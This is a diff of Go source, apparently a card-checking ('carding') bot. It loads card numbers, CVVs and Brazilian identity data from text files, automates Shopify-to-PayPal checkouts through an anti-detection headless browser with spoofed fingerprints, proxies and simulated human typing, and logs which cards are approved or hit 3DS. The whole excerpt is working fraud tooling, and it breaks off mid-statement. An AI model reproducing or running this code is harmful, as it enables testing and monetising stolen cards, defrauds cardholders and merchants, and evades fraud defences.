+	fmt.Printf("  → [moeda=%s] Selecionando...\n", moedaTentativa)
+	trocarMoedaPayPal(ctx, docLoc, moedaTentativa)
+	time.Sleep(time.Duration(randInt(400, 900)) * time.Millisecond)
+
+	submitPayPal(ctx, locs)
+
+	fmt.Println("  → Aguardando resultado (até 45s)...")
+	status, urlFinal := esperarResultadoPayPal(ctx)
+	fmt.Printf("  → URL final: %s (status=%d)\n", urlFinal, status)
+
+	switch status {
+	case 1:
+		var confirmacao string
+		_ = chromedp.Evaluate(`
+			(function(){
+				var all = document.querySelectorAll('*');
+				for(var i=0;i<all.length;i++){
+					var node = all[i];
+					if(node.children.length > 0) continue;
+					var t = (node.textContent || '').trim();
+					var m = t.match(/Confirma[çc][aã]o\s*n[oº°]?\s*(\S+)/i);
+					if(m) return 'Confirmação nº ' + m[1];
+				}
+				var body = document.body ? document.body.innerText : '';
+				var m2 = body.match(/Confirma[çc][aã]o\s*n[oº°]?\s*(\S+)/i);
+				return m2 ? 'Confirmação nº ' + m2[1] : '';
+			})()
+		`, &confirmacao).Do(ctx)
+
+		if confirmacao == "" {
+			confirmacao = "Confirmação nº (não extraída)"
+		}
+
+		salvarProva(ctx, card, confirmacao)
+
+		linha := fmt.Sprintf("%s %s %s %s %s PAGAMENTO APROVADO %s\n",
+			urlFinal, card.Numero, card.Mes, card.Ano, card.CVV, confirmacao)
+
+		fmt.Printf("\n  %s\n", cor(cGreen+cBold, "*** PAGAMENTO APROVADO ***"))
+		fmt.Printf("  %s\n", strings.TrimSpace(linha))
+
+		f, ferr := os.OpenFile("aprovadas.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if ferr == nil {
+			f.WriteString(linha)
+			f.Close()
+			fmt.Println("  → Salvo em aprovadas.txt")
+		}
+		return 1
+
+	case -1:
+		fmt.Printf("\n  %s %s %s %s %s -> VBV/3DS\n",
+			cor(cYell, "VBV:"), card.Numero, card.Mes, card.Ano, card.CVV)
+		salvarProva(ctx, card, "VBV/3DS")
+		f, ferr := os.OpenFile("vbv.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if ferr == nil {
+			fmt.Fprintf(f, "%s %s %s %s VBV/3DS %s\n",
+				urlFinal, card.Numero, card.Mes, card.Ano, card.CVV)
+			f.Close()
+		}
+		paypalUltimoDocLoc = docLoc
+		paypalUltimosLocs = locs
+		return -1
+
+	case -2:
+		fmt.Printf("\n  %s %s %s %s %s -> TIMEOUT\n",
+			cor(cRed, "RECUSADO:"), card.Numero, card.Mes, card.Ano, card.CVV)
+		paypalUltimoDocLoc = docLoc
+		paypalUltimosLocs = locs
+		return 0
+
+	default:
+		erroMsg := extrairErroPayPal(ctx, docLoc)
+		if erroMsg == "" {
+			erroMsg = "Erro desconhecido (sem mensagem extraída)"
+		}
+		fmt.Printf("\n  %s %s %s %s %s -> %s\n",
+			cor(cRed, "RECUSADO:"), card.Numero, card.Mes, card.Ano, card.CVV, erroMsg)
+
+		paypalUltimoDocLoc = docLoc
+		paypalUltimosLocs = locs
+		return 0
+	}
+}
+
+var (
+	paypalUltimoDocLoc string
+	paypalUltimosLocs  []string
+)
+
+func tentarTrocarMoedaEPagar(ctx context.Context, card *CartaoData, novaMoeda string) int {
+	docLoc := paypalUltimoDocLoc
+	locs := paypalUltimosLocs
+	if docLoc == "" {
+		locs = []string{"page"}
+	}
+
+	fmt.Printf("  → [fallback] Reaproveitando formulário PayPal em %s\n", docLoc)
+	fmt.Printf("  → [fallback] Trocando moeda para %s (sem refazer checkout)...\n", novaMoeda)
+
+	trocarMoedaPayPal(ctx, docLoc, novaMoeda)
+	time.Sleep(time.Duration(randInt(700, 1500)) * time.Millisecond)
+
+	submitPayPal(ctx, locs)
+
+	fmt.Println("  → Aguardando resultado (até 45s)...")
+	status, urlFinal := esperarResultadoPayPal(ctx)
+	fmt.Printf("  → URL final: %s (status=%d)\n", urlFinal, status)
+
+	switch status {
+	case 1:
+		var confirmacao string
+		_ = chromedp.Evaluate(`
+			(function(){
+				var body = document.body ? document.body.innerText : '';
+				var m2 = body.match(/Confirma[çc][aã]o\s*n[oº°]?\s*(\S+)/i);
+				return m2 ? 'Confirmação nº ' + m2[1] : '';
+			})()
+		`, &confirmacao).Do(ctx)
+		if confirmacao == "" {
+			confirmacao = "Confirmação nº (não extraída)"
+		}
+		salvarProva(ctx, card, confirmacao)
+		linha := fmt.Sprintf("%s %s %s %s %s PAGAMENTO APROVADO %s\n",
+			urlFinal, card.Numero, card.Mes, card.Ano, card.CVV, confirmacao)
+		fmt.Printf("\n  %s\n", cor(cGreen+cBold, "*** PAGAMENTO APROVADO (fallback moeda) ***"))
+		fmt.Printf("  %s\n", strings.TrimSpace(linha))
+		f, ferr := os.OpenFile("aprovadas.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if ferr == nil {
+			f.WriteString(linha)
+			f.Close()
+			fmt.Println("  → Salvo em aprovadas.txt")
+		}
+		return 1
+
+	case -1:
+		fmt.Printf("\n  %s %s %s %s %s -> VBV/3DS\n",
+			cor(cYell, "VBV:"), card.Numero, card.Mes, card.Ano, card.CVV)
+		salvarProva(ctx, card, "VBV/3DS")
+		f, ferr := os.OpenFile("vbv.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if ferr == nil {
+			fmt.Fprintf(f, "%s %s %s %s VBV/3DS %s\n",
+				urlFinal, card.Numero, card.Mes, card.Ano, card.CVV)
+			f.Close()
+		}
+		return -1
+
+	default:
+		erroMsg := extrairErroPayPal(ctx, docLoc)
+		if erroMsg == "" {
+			erroMsg = "Erro desconhecido (sem mensagem extraída)"
+		}
+		fmt.Printf("\n  %s %s %s %s %s -> %s\n",
+			cor(cRed, "RECUSADO:"), card.Numero, card.Mes, card.Ano, card.CVV, erroMsg)
+		return 0
+	}
+}
+
+func selectDebito(ctx context.Context, docLoc string) {
+	var res string
+	dl := time.Now().Add(15 * time.Second)
+	for time.Now().Before(dl) {
+		res = evaluateJS(ctx, selecionarPorLabel(docLoc, "combo-card-type-DEBIT"))
+		fmt.Printf("    débito → %s\n", res)
+		if strings.HasPrefix(res, "ok:") || strings.HasPrefix(res, "radio-ok:") {
+			return
+		}
+		time.Sleep(time.Duration(randInt(250, 600)) * time.Millisecond)
+	}
+	fmt.Println(cor(cYell, "    ⚠ débito não achado — tentando crédito como fallback"))
+	selectCredito(ctx, docLoc)
+}
+
+func selectCredito(ctx context.Context, docLoc string) {
+	var res string
+	dl := time.Now().Add(15 * time.Second)
+	for time.Now().Before(dl) {
+		res = evaluateJS(ctx, selecionarPorLabel(docLoc, "combo-card-type-CREDIT"))
+		fmt.Printf("    crédito → %s\n", res)
+		if strings.HasPrefix(res, "ok:") || strings.HasPrefix(res, "radio-ok:") {
+			return
+		}
+		time.Sleep(time.Duration(randInt(250, 600)) * time.Millisecond)
+	}
+	fmt.Println(cor(cYell, "    ⚠ crédito não achado — tentando débito como fallback"))
+	selectDebito(ctx, docLoc)
+}
+
+func salvarProva(ctx context.Context, card *CartaoData, confirmacao string) {
+	os.MkdirAll("provas", 0755)
+	base := fmt.Sprintf("provas/%s_%d", card.Numero, time.Now().Unix())
+
+	var buf []byte
+	if err := chromedp.CaptureScreenshot(&buf).Do(ctx); err == nil {
+		_ = os.WriteFile(base+".png", buf, 0644)
+		fmt.Println("  → Screenshot salvo:", base+".png")
+	}
+	var html string
+	if err := chromedp.OuterHTML("html", &html).Do(ctx); err == nil {
+		_ = os.WriteFile(base+".html", []byte(html), 0644)
+		fmt.Println("  → HTML salvo:", base+".html")
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Automação principal
+// ---------------------------------------------------------------------------
+
+func fluxoCompleto(dados *DadosTxt, card *CartaoData, end *Pessoa4Devs, email, checkoutURL string, reg RegiaoBR, persona Persona, moedaPrincipal string) int {
+	partes := strings.Fields(dados.Nome)
+	primeiroNome := partes[0]
+	sobrenome := ""
+	if len(partes) > 1 {
+		sobrenome = strings.Join(partes[1:], " ")
+	}
+	numero := fmt.Sprintf("%d", end.Numero)
+
+	moedaOposta := "USD"
+	if moedaPrincipal == "USD" {
+		moedaOposta = "BRL"
+	}
+
+	fmt.Printf("  [persona] %s | tipo=%s | moeda principal=%s | fallback=%s\n",
+		persona.Nome, tipoCartao, moedaPrincipal, moedaOposta)
+
+	fmt.Printf("  [proxy] iniciando proxy local → %s\n", proxyHost)
+	localProxy, pararProxy, err := iniciarProxyLocal(proxyHost, proxyUser, proxyPass)
+	if err != nil {
+		fmt.Printf("  [proxy] erro: %v\n", err)
+		return -1
+	}
+	defer pararProxy()
+	fmt.Printf("  [proxy] escutando em %s\n", localProxy)
+
+	fp := sortearFingerprint(reg)
+	fmt.Printf("  [fp] %s | %dx%d | TZ=%s | HC=%d | DM=%d | GPU=%.40s\n",
+		fp.Platform, fp.Width, fp.Height, fp.Timezone, fp.HardwareConcurrency, fp.DeviceMemory, fp.WebGLRenderer)
+
+	opts := append(chromedp.DefaultExecAllocatorOptions[:],
+		chromedp.Flag("headless", headless),
+		chromedp.Flag("disable-blink-features", "AutomationControlled"),
+		chromedp.Flag("no-sandbox", true),
+		chromedp.Flag("disable-dev-shm-usage", true),
+		chromedp.Flag("proxy-server", localProxy),
+		chromedp.UserAgent(fp.UserAgent),
+		chromedp.WindowSize(fp.Width, fp.Height),
+		chromedp.Flag("lang", fp.Languages),
+		chromedp.Env("TZ="+fp.Timezone),
+		chromedp.Flag("disable-features",
+			"WebRtcHideLocalIpsWithMdns,WebRTC,Translate,BackForwardCache,AcceptCHFrame,MediaRouter,OptimizationHints,"+
+				"AutofillServerCommunication,AutofillEnableAccountWalletStorage,AutofillSaveCardBubble,"+
+				"AutofillAddressEnabled,AutofillCreditCardEnabled,AutofillEnableToolbarStatusChip"),
+		chromedp.Flag("disable-background-networking", true),
+		chromedp.Flag("disable-default-apps", true),
+		chromedp.Flag("disable-extensions", true),
+		chromedp.Flag("disable-sync", true),
+		chromedp.Flag("metrics-recording-only", true),
+		chromedp.Flag("mute-audio", true),
+		chromedp.Flag("no-first-run", true),
+		chromedp.Flag("disable-gpu", false),
+		chromedp.Flag("force-device-scale-factor", fmt.Sprintf("%.2f", fp.DeviceScaleFactor)),
+		chromedp.Flag("dns-prefetch-disable", true),
+		chromedp.Flag("enable-automation", false),
+		chromedp.Flag("password-store", "basic"),
+		chromedp.Flag("use-mock-keychain", true),
+		// ANTI-AUTOFILL do Chrome (popup "Salvar endereço?")
+		chromedp.Flag("disable-save-password-bubble", true),
+		chromedp.Flag("disable-autofill-keyboard-accessory-view", true),
+		chromedp.Flag("disable-single-click-autofill", true),
+		chromedp.Flag("disable-prompt-on-repost", true),
+		chromedp.Flag("disable-client-side-phishing-detection", true),
+		chromedp.Flag("disable-component-update", true),
+		chromedp.Flag("disable-domain-reliability", true),
+	)
+
+	allocCtx, cancelAlloc := chromedp.NewExecAllocator(context.Background(), opts...)
+	defer cancelAlloc()
+	ctxBase, cancelCtx := chromedp.NewContext(allocCtx,
+		chromedp.WithLogf(func(string, ...interface{}) {}),
+		chromedp.WithErrorf(func(string, ...interface{}) {}),
+	)
+	defer cancelCtx()
+
+	ctx := withPersona(ctxBase, persona)
+
+	if err := chromedp.Run(ctx,
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			return chromedp.Evaluate(stealthScript(fp), nil).Do(ctx)
+		}),
+	); err != nil {
+		fmt.Printf("  [stealth] aviso: %v\n", err)
+	}
+
+	shopify := []chromedp.Action{
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Navegando para o checkout Shopify...")
+			return chromedp.Navigate(checkoutURL).Do(ctx)
+		}),
+		chromedp.WaitVisible(`#email`, chromedp.ByID),
+		humanRandSleep(900, 1800),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Lendo página inicial...")
+			p := getPersona(ctx)
+			return humanReadPage(p.LeituraMinMs, p.LeituraMaxMs).Do(ctx)
+		}),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ E-mail:", email)
+			return humanTypePersona(`#email`, email).Do(ctx)
+		}),
+		humanRandSleep(300, 700),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Nome:", primeiroNome)
+			return humanTypePersona(`input[name="firstName"]`, primeiroNome).Do(ctx)
+		}),
+		humanRandSleep(200, 500),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Sobrenome:", sobrenome)
+			return humanTypePersona(`input[name="lastName"]`, sobrenome).Do(ctx)
+		}),
+		humanRandSleep(250, 600),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ CEP:", end.CEP)
+			return humanTypePersona(`input[name="postalCode"]`, end.CEP).Do(ctx)
+		}),
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Aguardando auto-fill do CEP...")
+			return humanRandSleep(3000, 5000).Do(ctx)
+		}),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			var rua string
+			_ = chromedp.Value(`input[name="streetName"]`, &rua, chromedp.ByQuery).Do(ctx)
+			if rua == "" {
+				fmt.Println("→ Endereço:", end.Endereco)
+				_ = humanTypePersona(`input[name="streetName"]`, end.Endereco).Do(ctx)
+			} else {
+				fmt.Println("→ Endereço (autofill):", rua)
+			}
+			return nil
+		}),
+		humanRandSleep(200, 500),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			var v string
+			_ = chromedp.Value(`input[name="streetNumber"]`, &v, chromedp.ByQuery).Do(ctx)
+			if v == "" {
+				fmt.Println("→ Número:", numero)
+				_ = humanTypePersona(`input[name="streetNumber"]`, numero).Do(ctx)
+			} else {
+				fmt.Println("→ Número (autofill):", v)
+			}
+			return nil
+		}),
+		humanRandSleep(200, 500),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			var v string
+			_ = chromedp.Value(`input[name="district"]`, &v, chromedp.ByQuery).Do(ctx)
+			if v == "" {
+				fmt.Println("→ Bairro:", end.Bairro)
+				_ = humanTypePersona(`input[name="district"]`, end.Bairro).Do(ctx)
+			} else {
+				fmt.Println("→ Bairro (autofill):", v)
+			}
+			return nil
+		}),
+		humanRandSleep(200, 500),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			var v string
+			_ = chromedp.Value(`input[name="city"]`, &v, chromedp.ByQuery).Do(ctx)
+			if v == "" {
+				fmt.Println("→ Cidade:", end.Cidade)
+				_ = humanTypePersona(`input[name="city"]`, end.Cidade).Do(ctx)
+			} else {
+				fmt.Println("→ Cidade (autofill):", v)
+			}
+			return nil
+		}),
+		humanRandSleep(200, 500),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Estado:", end.Estado)
+			script := fmt.Sprintf(`
+				(function(){
+					var el = document.querySelector('select[name="zone"]');
+					if (!el) return "not found";
+					el.value = %q;
+					el.dispatchEvent(new Event('change',{bubbles:true}));
+					el.dispatchEvent(new Event('blur',  {bubbles:true}));
+					return "ok";
+				})()`, end.Estado)
+			var res string
+			_ = chromedp.Evaluate(script, &res).Do(ctx)
+			return nil
+		}),
+		humanRandSleep(400, 900),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Aguardando frete carregar...")
+			dl := time.Now().Add(2 * time.Second)
+			for time.Now().Before(dl) {
+				var found bool
+				_ = chromedp.Evaluate(`
+					(function(){
+						var radios = document.querySelectorAll('input[name="shipping"], [data-testid="shipping-rate-list"] input, .shipping-rate input');
+						if (radios.length > 0) return true;
+						var el = document.querySelector('[data-delivery-group]');
+						return !!el;
+					})()
+				`, &found).Do(ctx)
+				if found {
+					fmt.Println("  → frete carregado!")
+					break
+				}
+				time.Sleep(time.Duration(randInt(200, 400)) * time.Millisecond)
+			}
+			return nil
+		}),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Clicando em Cartão de Crédito/Débito (Shopify)...")
+			var res string
+			err := chromedp.Evaluate(`
+				(function(){
+					var btns = document.querySelectorAll('[data-testid="payment-method-option"], label, div[role="radio"], div[role="button"]');
+					for (var i = 0; i < btns.length; i++) {
+						var t = (btns[i].textContent || '').toLowerCase();
+						if (t.indexOf('cartão') >= 0 || t.indexOf('cartao') >= 0 ||
+						    t.indexOf('crédito') >= 0 || t.indexOf('credito') >= 0 ||
+						    t.indexOf('débito') >= 0 || t.indexOf('debito') >= 0) {
+							btns[i].click();
+							return 'clicked:' + t.trim().substring(0,50);
+						}
+					}
+					var fallback = document.querySelector('input[type="radio"][name="basic"]');
+					if (fallback) { fallback.click(); return 'fallback-radio'; }
+					return 'not-found';
+				})()
+			`, &res).Do(ctx)
+			if err != nil {
+				return err
+			}
+			fmt.Printf("  → %s\n", res)
+			return nil
+		}),
+		humanRandSleep(400, 900),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Selecionando 'Usar endereço de entrega'...")
+			err := chromedp.Click(`#billing_address_selector-shipping_address`, chromedp.ByID).Do(ctx)
+			if err != nil {
+				fmt.Println("  (aviso: billing radio não encontrado)")
+			}
+			return nil
+		}),
+		humanRandSleep(200, 500),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ CPF Shopify:", dados.CPF)
+			sel := `input[name="CPF/CNPJ"]`
+			waitCtx, cancel := context.WithTimeout(ctx, 20*time.Second)
+			defer cancel()
+			if err := chromedp.WaitVisible(sel, chromedp.ByQuery).Do(waitCtx); err != nil {
+				fmt.Println("  (aviso: campo CPF/CNPJ não ficou visível)")
+				return nil
+			}
+			time.Sleep(time.Duration(randInt(250, 500)) * time.Millisecond)
+
+			valida := func() string {
+				var v string
+				_ = chromedp.Value(sel, &v, chromedp.ByQuery).Do(ctx)
+				return v
+			}
+
+			_ = humanTypePersona(sel, dados.CPF).Do(ctx)
+			time.Sleep(time.Duration(randInt(150, 350)) * time.Millisecond)
+			if v := valida(); v != "" {
+				fmt.Printf("  CPF [formatado]: %q\n", v)
+				return nil
+			}
+
+			cpfDigits := ""
+			for _, c := range dados.CPF {
+				if c >= '0' && c <= '9' {
+					cpfDigits += string(c)
+				}
+			}
+			_ = humanTypePersona(sel, cpfDigits).Do(ctx)
+			time.Sleep(time.Duration(randInt(150, 350)) * time.Millisecond)
+			v := valida()
+			fmt.Printf("  CPF [digitos]: %q\n", v)
+			return nil
+		}),
+		humanRandSleep(400, 900),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Pausa final antes de clicar em Pagar...")
+			p := getPersona(ctx)
+			return humanReadPage(p.PausaFinalMinMs, p.PausaFinalMaxMs).Do(ctx)
+		}),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Clicando 'Pagar agora' (Shopify)...")
+			dl := time.Now().Add(10 * time.Second)
+			for time.Now().Before(dl) {
+				var disabled bool
+				_ = chromedp.Evaluate(`!!document.querySelector('#checkout-pay-button[disabled]')`, &disabled).Do(ctx)
+				if !disabled {
+					break
+				}
+				time.Sleep(time.Duration(randInt(300, 600)) * time.Millisecond)
+			}
+			return chromedp.Click(`#checkout-pay-button`, chromedp.ByID).Do(ctx)
+		}),
+	}
+
+	var resultadoPrincipal int
+	var vbvDetectado bool
+	paypal := []chromedp.Action{
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Aguardando navegação para PayPal...")
+			dl := time.Now().Add(60 * time.Second)
+			for time.Now().Before(dl) {
+				var u string
+				_ = chromedp.Location(&u).Do(ctx)
+				if strings.Contains(u, "paypal.com") || strings.Contains(u, "processing") {
+					fmt.Printf("  → URL: %s\n", u)
+					return nil
+				}
+				time.Sleep(time.Second)
+			}
+			return fmt.Errorf("timeout aguardando redirecionamento para PayPal")
+		}),
+		humanRandSleep(1000, 2000),
+
+		// Fecha popups ANTES de preencher
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			fmt.Println("→ Fechando popups (cookies/save address)...")
+			return fecharPopupsPayPal(ctx).Do(ctx)
+		}),
+		humanRandSleep(500, 1000),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			resultadoPrincipal = preencherPayPal(ctx, card, end, dados, moedaPrincipal)
+			return nil
+		}),
+
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			if resultadoPrincipal == -1 {
+				vbvDetectado = true
+				return nil
+			}
+			if resultadoPrincipal != 0 {
+				return nil
+			}
+			fmt.Printf("\n  → RECUSADO em %s — trocando para %s na MESMA página...\n",
+				moedaPrincipal, moedaOposta)
+			time.Sleep(time.Duration(randInt(1500, 3000)) * time.Millisecond)
+
+			resultadoOposta := tentarTrocarMoedaEPagar(ctx, card, moedaOposta)
+			if resultadoOposta == 1 {
+				resultadoPrincipal = 1
+			} else if resultadoOposta == -1 {
+				resultadoPrincipal = -1
+				vbvDetectado = true
+			} else {
+				resultadoPrincipal = 0
+			}
+			return nil
+		}),
+	}
+
+	all := append(shopify, paypal...)
+	err = chromedp.Run(ctx, all...)
+	if err != nil {
+		fmt.Printf("\n%s\n", cor(cRed+cBold, "╔══════════════════════════════════════════╗"))
+		fmt.Printf("%s\n", cor(cRed+cBold, "║  ERRO NA AUTOMAÇÃO                       ║"))
+		fmt.Printf("%s\n", cor(cRed+cBold, "╚══════════════════════════════════════════╝"))
+		fmt.Printf("  %v\n\n", err)
+		return -1
+	}
+
+	if vbvDetectado {
+		fmt.Printf("\n%s\n", cor(cYell+cBold, "╔══════════════════════════════════════════╗"))
+		fmt.Printf("%s\n", cor(cYell+cBold, "║  🔒 VBV/3DS DETECTADO                    ║"))
+		fmt.Printf("%s\n\n", cor(cYell+cBold, "╚══════════════════════════════════════════╝"))
+		return -2
+	}
+
+	fmt.Printf("\n%s\n", cor(cGreen+cBold, "╔══════════════════════════════════════════╗"))
+	fmt.Printf("%s\n", cor(cGreen+cBold, "║  ✓ AUTOMAÇÃO CONCLUÍDA                   ║"))
+	fmt.Printf("%s\n\n", cor(cGreen+cBold, "╚══════════════════════════════════════════╝"))
+
+	return resultadoPrincipal
+}
+
+// ---------------------------------------------------------------------------
+// Proxy local — INALTERADO
+// ---------------------------------------------------------------------------
+
+func iniciarProxyLocal(upstreamAddr, user, pass string) (localAddr string, parar func(), err error) {
+	auth := "Basic " + base64.StdEncoding.EncodeToString([]byte(user+":"+pass))
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		return "", nil, fmt.Errorf("proxy local: %w", err)
+	}
+	srv := &http.Server{
+		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			upConn, err := net.DialTimeout("tcp", upstreamAddr, 20*time.Second)
+			if err != nil {
+				http.Error(w, "upstream: "+err.Error(), http.StatusBadGateway)
+				return
+			}
+			if r.Method == http.MethodConnect {
+				fmt.Fprintf(upConn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Authorization: %s\r\nProxy-Connection: Keep-Alive\r\n\r\n",
+					r.Host, r.Host, auth)
+
+				br := bufio.NewReader(upConn)
+				resp, err := http.ReadResponse(br, &http.Request{Method: http.MethodConnect})
+				if err != nil {
+					upConn.Close()
+					http.Error(w, "read CONNECT resp: "+err.Error(), http.StatusBadGateway)
+					return
+				}
+				if resp.StatusCode != http.StatusOK {
+					upConn.Close()
+					http.Error(w, fmt.Sprintf("tunnel falhou: %d %s", resp.StatusCode, resp.Status), http.StatusBadGateway)
+					return
+				}
+
+				hj, ok := w.(http.Hijacker)
+				if !ok {
+					upConn.Close()
+					http.Error(w, "hijack não suportado", http.StatusInternalServerError)
+					return
+				}
+				clConn, _, err := hj.Hijack()
+				if err != nil {
+					upConn.Close()
+					http.Error(w, "hijack: "+err.Error(), http.StatusInternalServerError)
+					return
+				}
+				clConn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))
+
+				go func() {
+					io.Copy(upConn, clConn)
+					upConn.Close()
+				}()
+				io.Copy(clConn, br)
+				clConn.Close()
+			} else {
+				defer upConn.Close()
+				r.Header.Set("Proxy-Authorization", auth)
+				r.Header.Del("Proxy-Connection")
+				if err := r.WriteProxy(upConn); err != nil {
+					http.Error(w, "write: "+err.Error(), http.StatusBadGateway)
+					return
+				}
+				resp, err := http.ReadResponse(bufio.NewReader(upConn), r)
+				if err != nil {
+					http.Error(w, "read: "+err.Error(), http.StatusBadGateway)
+					return
+				}
+				defer resp.Body.Close()
+				for k, v := range resp.Header {
+					w.Header()[k] = v
+				}
+				w.WriteHeader(resp.StatusCode)
+				io.Copy(w, resp.Body)
+			}
+		}),
+	}
+	go srv.Serve(ln)
+	return ln.Addr().String(), func() { srv.Close(); ln.Close() }, nil
+}
+
+// ---------------------------------------------------------------------------
+
+func lerLinks(arquivo string) ([]string, error) {
+	f, err := os.Open(arquivo)
+	if err != nil {
+		return nil, fmt.Errorf("não foi possível abrir %s: %w", arquivo, err)
+	}
+	defer f.Close()
+	var links []string
+	sc := bufio.NewScanner(f)
+	for sc.Scan() {
+		if l := strings.TrimSpace(sc.Text()); l != "" {
+			links = append(links, l)
+		}
+	}
+	if len(links) == 0 {
+		return nil, fmt.Errorf("%s está vazio", arquivo)
+	}
+	return links, sc.Err()
+}
+
+type slotTrabalho struct {
+	id      int
+	dados   *DadosTxt
+	card    *CartaoData
+	end     *Pessoa4Devs
+	reg     RegiaoBR
+	email   string
+	url     string
+	persona Persona
+}
+
+// ---------------------------------------------------------------------------
+// PROMPT INICIAL
+// ---------------------------------------------------------------------------
+
+func perguntarOpcoes() (string, string) {
+	reader := bufio.NewReader(os.Stdin)
+
+	var moeda string
+	for {
+		fmt.Println()
+		fmt.Println(cor(cCyan+cBold, "╔══════════════════════════════════════════╗"))
+		fmt.Println(cor(cCyan+cBold, "║  ESCOLHA A MOEDA DO PAGAMENTO            ║"))
+		fmt.Println(cor(cCyan+cBold, "╠══════════════════════════════════════════╣"))
+		fmt.Println(cor(cCyan+cBold, "║  [1] BRL  (conversão explícita)          ║"))
+		fmt.Println(cor(cCyan+cBold, "║  [2] USD  (moeda padrão, sem conversão)  ║"))
+		fmt.Println(cor(cCyan+cBold, "╚══════════════════════════════════════════╝"))
+		fmt.Print("  Digite 1 ou 2: ")
+
+		linha, err := reader.ReadString('\n')
+		if err != nil {
+			moeda = "USD"
+			break
+		}
+		linha = strings.TrimSpace(strings.ToUpper(linha))
+		switch linha {
+		case "1", "BRL":
+			moeda = "BRL"
+		case "2", "USD", "":
+			moeda = "USD"
+		default:
+			fmt.Println(cor(cYell, "  ⚠ Opção inválida. Digite 1 (BRL) ou 2 (USD)."))
+			continue
+		}
+		break
+	}
+
+	var tipo string
+	for {
+		fmt.Println()
+		fmt.Println(cor(cCyan+cBold, "╔══════════════════════════════════════════╗"))
+		fmt.Println(cor(cCyan+cBold, "║  ESCOLHA O TIPO DE CARTÃO                ║"))
+		fmt.Println(cor(cCyan+cBold, "╠══════════════════════════════════════════╣"))
+		fmt.Println(cor(cCyan+cBold, "║  [1] DÉBITO                              ║"))
+		fmt.Println(cor(cCyan+cBold, "║  [2] CRÉDITO                             ║"))
+		fmt.Println(cor(cCyan+cBold, "╚══════════════════════════════════════════╝"))
+		fmt.Print("  Digite 1 ou 2: ")
+
+		linha, err := reader.ReadString('\n')
+		if err != nil {
+			tipo = "debito"
+			break
+		}
+		linha = strings.TrimSpace(strings.ToUpper(linha))
+		switch linha {
+		case "1", "DEBITO", "DÉBITO":
+			tipo = "debito"
+		case "2", "CREDITO", "CRÉDITO", "":
+			tipo = "credito"
+		default:
+			fmt.Println(cor(cYell, "  ⚠ Opção inválida. Digite 1 (Débito) ou 2 (Crédito)."))
+			continue
+		}
+		break
+	}
+
+	return moeda, tipo
+}
+
+// ---------------------------------------------------------------------------
+
+func main() {
+	fmt.Println(cor(cCyan+cBold, "╔══════════════════════════════════════════╗"))
+	fmt.Println(cor(cCyan+cBold, "║    CHECKOUT BOT — STEALTH HUMAN MODE     ║"))
+	fmt.Println(cor(cCyan+cBold, "╚══════════════════════════════════════════╝"))
+
+	moedaEscolhida, tipoCartao = perguntarOpcoes()
+	fmt.Printf("  %s Moeda inicial: %s | Tipo: %s%s\n",
+		cor(cGreen+cBold, "✓"), moedaEscolhida, tipoCartao, cReset)
+
+	fmt.Printf("  headless=%v | workers=%d\n", headless, numWorkers)
+
+	links, err := lerLinks("randlinks.txt")
+	if err != nil {
+		fmt.Println("ERRO ao carregar randlinks.txt:", err)
+		os.Exit(1)
+	}
+	fmt.Printf("  %d link(s) carregado(s) de randlinks.txt\n", len(links))
+
+	urlIdx := 0
+
+	for onda := 1; ; onda++ {
+		gp.mu.Lock()
+		gp.ondaAtual = onda
+		gp.mu.Unlock()
+
+		fmt.Printf("\n%s\n", cor(cCyan+cBold, "╔══════════════════════════════════════════╗"))
+		fmt.Printf("%s\n", cor(cCyan+cBold, fmt.Sprintf("║  ONDA %-3d  (%d workers simultâneos)      ║", onda, numWorkers)))
+		fmt.Printf("%s\n", cor(cCyan+cBold, "╚══════════════════════════════════════════╝"))
+
+		var lote []slotTrabalho
+		for i := 1; i <= numWorkers; i++ {
+			dados, err := lerEDeletarPrimeiro("dadosrandom.txt")
+			if err != nil {
+				fmt.Printf("  [slot %d] dadosrandom.txt esgotado.\n", i)
+				break
+			}
+			card, err := lerEDeletarCartao("carnews.txt")
+			if err != nil {
+				fmt.Printf("  [slot %d] carnews.txt esgotado.\n", i)
+				break
+			}
+			reg := sortearRegiao()
+			persona := sortearPersona()
+			u := links[urlIdx%len(links)]
+			urlIdx++
+			lote = append(lote, slotTrabalho{
+				id: i, dados: dados, card: card, reg: reg, url: u, persona: persona,
+			})
+			fmt.Printf("  [slot %d] %s | %s | %s | persona=%s\n",
